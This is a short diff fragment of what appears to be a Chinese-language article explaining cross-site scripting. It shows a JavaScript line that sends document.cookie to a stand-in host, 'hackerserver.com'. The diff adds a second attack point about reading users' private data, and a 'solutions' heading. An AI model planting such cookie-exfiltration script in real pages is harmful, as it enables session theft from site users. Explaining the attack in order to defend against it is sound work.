@@ -71,7 +71,9 @@ document.body.appendChild(i);
 i.src = "http://www.hackerserver.com/?c=" + document.cookie;
 ```
 
+2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等，如代码：
 
+## 解决方法 {#解决方法}
 
 
 
